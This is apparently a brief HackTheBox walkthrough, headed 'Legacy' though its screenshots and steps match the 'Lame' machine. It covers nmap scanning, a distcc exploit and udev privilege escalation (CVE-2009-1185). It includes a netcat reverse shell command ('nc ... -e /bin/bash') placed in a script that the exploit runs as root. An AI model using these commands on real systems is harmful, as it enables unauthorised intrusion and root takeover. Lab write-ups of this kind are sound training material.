Legacy without Metasploit:

![Lame](https://user-images.githubusercontent.com/55708909/91424966-24d6d500-e878-11ea-8989-bca46c0cc916.png)



Starting with Nmap Scan :
Nmap -sC -sV -T4 -A -O -oA Legacy -p- 10.10.10.3

![Lame_nmap](https://user-images.githubusercontent.com/55708909/91425616-01f8f080-e879-11ea-9f03-d54ed3ca7e24.png)

FTP port doesn't have any info to give so i quickly switch to nmap vulnerability scripts as per my own methodology and found one vector to attack

![Lame_vuln](https://user-images.githubusercontent.com/55708909/91427248-3c638d00-e87b-11ea-994b-455883a3dc41.png)

distcc is kind of compilier and nmap has a script to exploit this vulnerability

![Lame_shell](https://user-images.githubusercontent.com/55708909/91429683-610c3480-e87c-11ea-959c-1d02e7e51b5b.png)

For Priviledge Escalation we are going to use 2009-1185

searchsploit -m 8572.c

It require process id of udevd : ps -aux |grep devd

As per this exploit the file run in tmp directory will be running with root priviledges.

run
#/bin/bash
nc -nv 10.10.10.10 4444 -e /bin/bash

transfer the file run in tmp directory and run these commands 

./8572 2688 (as per my pc udevd PID. It can be differet for yours)

and we get reverse connection on netcat at port 4444









